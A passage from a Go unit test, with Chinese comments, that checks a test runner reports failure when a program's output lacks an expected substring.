		t.Fatalf("verdicts 应全命中：%+v", verdicts)
	}
	// 反例：不存在的子串仍须失败。
	plan2 := &TestPlan{Tests: []TestCase{
		{Name: "失败：子串不存在", Argv: []string{"python3", "tool.py"}, ExpectContains: "NO-SUCH-MARKER"},
	}}
	if _, _, err := p.runTests(context.Background(), "forge-test", gap, stageDir, "tool.py", plan2, false); err == nil {
		t.Fatalf("不存在的子串应判失败")
	}
}
